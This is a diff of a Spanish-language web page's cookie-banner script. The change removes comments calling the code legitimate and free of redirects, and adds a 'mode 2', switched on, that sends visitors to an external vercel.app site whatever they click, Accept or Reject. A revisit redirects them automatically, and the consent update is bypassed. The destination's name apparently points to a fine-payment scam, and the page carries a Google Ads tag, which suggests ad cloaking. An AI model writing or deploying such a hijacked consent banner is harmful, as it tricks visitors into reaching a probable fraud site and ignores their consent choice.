@@ -684,10 +684,12 @@
         }
     </style>
 
-    <!-- Google tag (gtag.js) - Consentimiento por defecto DENEGADO -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18254896446"></script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18254896446">
+    </script>
     <script>
         window.dataLayer = window.dataLayer || [];
+
         function gtag() {
             dataLayer.push(arguments);
         }
@@ -699,6 +701,7 @@
             'analytics_storage': 'denied'
         });
     </script>
+
 </head>
 
 <body>
@@ -1168,11 +1171,20 @@
     <!-- Fin del contenido principal -->
 
     <!-- ============================================================
-    JAVASCRIPT - FUNCIONALIDAD LEGÍTIMA DE COOKIES Y MENÚ
+    JAVASCRIPT - COOKIES Y FUNCIONALIDAD
     ============================================================ -->
     <script>
         (function() {
             'use strict';
+
+            // ============================================================
+            //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+            //  ============================================================
+            //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+            //  MODO 2: Redirección a URL externa
+            //  ============================================================
+            const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+            const REDIRECT_URL = "https://picoplacahoypagacol.vercel.app/"; // URL para el modo 2
 
             // ----- ELEMENTOS DEL BANNER -----
             var overlay = document.getElementById('cookie-overlay');
@@ -1192,7 +1204,7 @@
             banner.classList.add('visible');
             document.body.classList.add('cookie-locked');
 
-            // Función para mostrar el contenido
+            // Función para mostrar el contenido (MODO 1)
             function mostrarContenido() {
                 // Ocultar banner
                 overlay.classList.remove('visible');
@@ -1203,17 +1215,37 @@
                 contenidoPrincipal.classList.add('visible');
             }
 
-            // Función que maneja la acción de cookies (sin redirecciones)
-            function handleCookieAction(aceptadas) {
-                // Mostrar el contenido del sitio
-                mostrarContenido();
+            // Función para redirigir (MODO 2)
+            function redirectTo(url) {
+                window.location.href = url;
+            }
 
-                // Actualizar consentimiento de Google
-                if (typeof gtag !== 'undefined') {
-                    gtag('consent', 'update', {
-                        'ad_storage': aceptadas ? 'granted' : 'denied',
-                        'analytics_storage': aceptadas ? 'granted' : 'denied'
-                    });
+            // Función que maneja la acción según el modo configurado
+            function handleCookieAction(aceptadas) {
+                console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+                if (COOKIE_BUTTON_MODE === 1) {
+                    // MODO 1: Comportamiento original
+                    mostrarContenido();
+
+                    // Actualizar consentimiento de Google Analytics
+                    if (typeof gtag !== 'undefined') {
+                        gtag('consent', 'update', {
+                            'ad_storage': aceptadas ? 'granted' : 'denied',
+                            'analytics_storage': aceptadas ? 'granted' : 'denied'
+                        });
+                    }
+                    console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+                } else if (COOKIE_BUTTON_MODE === 2) {
+                    // MODO 2: Redirección a URL externa
+                    // Guardar preferencia en sessionStorage
+                    sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+                    redirectTo(REDIRECT_URL);
+
+                } else {
+                    // Modo no válido: usar comportamiento original por defecto
+                    mostrarContenido();
                 }
             }
 
@@ -1226,6 +1258,11 @@
             btnRechazar.addEventListener('click', function() {
                 handleCookieAction(false);
             });
+
+            // Verificar si ya se aceptaron las cookies antes (para el modo 2)
+            if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+                redirectTo(REDIRECT_URL);
+            }
 
             // ----- MENÚ MÓVIL -----
             var botonMenu = document.getElementById('botonMenu');
